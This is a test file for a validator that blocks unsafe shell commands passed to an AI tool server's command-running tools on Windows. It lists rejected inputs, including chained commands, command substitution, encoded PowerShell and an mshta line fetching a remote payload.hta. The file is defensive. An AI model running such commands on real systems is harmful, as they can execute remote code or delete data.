import { describe, expect, it, vi } from 'vitest';
import {
  assertValidCommandForHost,
  validateCommandForHost,
} from '../server/tools/command_platform';
import { registerDesktopTools } from '../server/tools/definitions/desktop_tools';
import { registerSystemOpsTools } from '../server/tools/definitions/system_ops';
import { ToolRegistry } from '../server/tools/registry';

describe('host-platform command validation', () => {
  it.each([
    'find /',
    'find ~',
    'rm file.txt',
    '/bin/sh -c whoami',
  ])('rejects POSIX command syntax on Windows: %s', command => {
    expect(validateCommandForHost(command, 'win32')).toMatchObject({
      ok: false,
      platform: 'win32',
      code: 'unsupported_platform_command',
    });
  });

  it.each([
    'echo ok & del file.txt',
    'whoami && dir',
    'echo ok | findstr ok',
    'echo ok\r\ndir',
    'echo $(whoami)',
  ])('rejects raw shell chaining and command substitution: %s', command => {
    expect(validateCommandForHost(command, 'win32')).toMatchObject({
      ok: false,
      code: 'shell_control_operator',
    });
  });

  it('allows one native command and does not mistake quoted text for chaining', () => {
    expect(validateCommandForHost('whoami', 'win32')).toMatchObject({ ok: true, executable: 'whoami' });
    expect(validateCommandForHost('find "a & b" notes.txt', 'win32')).toMatchObject({ ok: true, executable: 'find' });
    expect(() => assertValidCommandForHost('echo "a & b"', 'win32')).not.toThrow();
  });

  it.each([
    'cmd.exe /c "echo safe & whoami"',
    '%COMSPEC% /c "echo safe & whoami"',
    'powershell.exe -NoProfile -Command "Write-Output safe; whoami"',
    'pwsh -EncodedCommand ZQBjAGgAbwAgAHMAYQBmAGUA',
    'powershell.exe -enc ZQBjAGgAbwAgAHMAYQBmAGUA',
    'powershell.exe -enco ZQBjAGgAbwAgAHMAYQBmAGUA',
    'powershell.exe /Command "Write-Output safe; whoami"',
    'pwsh.exe -CommandWithArgs "Write-Output safe; whoami"',
    'powershell.exe -File C:\\Temp\\job.ps1',
    'wscript.exe unsafe.vbs',
    'cscript unsafe.vbs',
    'mshta.exe https://example.invalid/payload.hta',
  ])('rejects nested Windows shell and script-host execution: %s', command => {
    expect(validateCommandForHost(command, 'win32')).toMatchObject({
      ok: false,
      code: 'nested_shell_command',
    });
  });

  it('fails closed at the server run_command handler before process execution', async () => {
    const registry = new ToolRegistry();
    registerSystemOpsTools(registry);
    await expect(registry.execute(
      'run_command',
      { command: 'echo safe & whoami' },
      { userId: 'command-test', userConfirmed: true },
    )).rejects.toMatchObject({
      name: 'CommandPlatformValidationError',
      code: 'shell_control_operator',
    });
  });

  it('rejects a non-allowlisted executable before asking for confirmation', async () => {
    const registry = new ToolRegistry();
    registerSystemOpsTools(registry);
    const requestConfirmation = vi.fn(async () => true);

    await expect(registry.execute(
      'run_command',
      { command: 'tasklist' },
      { userId: 'command-preflight-test', requestConfirmation },
    )).rejects.toMatchObject({
      name: 'CommandAllowlistValidationError',
      code: 'command_not_allowlisted',
    });
    expect(requestConfirmation).not.toHaveBeenCalled();
  });

  it.each([
    'tasklist | findstr node',
    'echo ok > output.txt',
    'where node & where npm',
  ])('rejects an invalid command before creating a confirmation: %s', async command => {
    const registry = new ToolRegistry();
    registerSystemOpsTools(registry);
    const requestConfirmation = vi.fn(async () => true);

    await expect(registry.execute(
      'run_command',
      { command },
      { userId: 'command-preflight-test', requestConfirmation },
    )).rejects.toMatchObject({
      name: 'CommandPlatformValidationError',
      code: 'shell_control_operator',
    });
    expect(requestConfirmation).not.toHaveBeenCalled();
  });

  it('fails closed before relaying an invalid Windows desktop command', async () => {
    const registry = new ToolRegistry();
    registerDesktopTools(registry);
    const desktopRelay = vi.fn(async () => 'must not run');

    await expect(registry.execute(
      'desktop_run_command',
      { command: 'find /' },
      {
        userId: 'desktop-command-test',
        userConfirmed: true,
        desktopPlatform: 'win32',
        desktopRelay,
      },
    )).rejects.toMatchObject({
      name: 'CommandPlatformValidationError',
      code: 'unsupported_platform_command',
    });
    expect(desktopRelay).not.toHaveBeenCalled();
  });

  it('preflights a desktop shell operator before asking for confirmation', async () => {
    const registry = new ToolRegistry();
    registerDesktopTools(registry);
    const requestConfirmation = vi.fn(async () => true);
    const desktopRelay = vi.fn(async () => 'must not run');

    await expect(registry.execute(
      'desktop_run_command',
      { command: 'tasklist | findstr node' },
      {
        userId: 'desktop-command-preflight-test',
        desktopPlatform: 'win32',
        desktopRelay,
        requestConfirmation,
      },
    )).rejects.toMatchObject({
      name: 'CommandPlatformValidationError',
      code: 'shell_control_operator',
    });
    expect(requestConfirmation).not.toHaveBeenCalled();
    expect(desktopRelay).not.toHaveBeenCalled();
  });
});
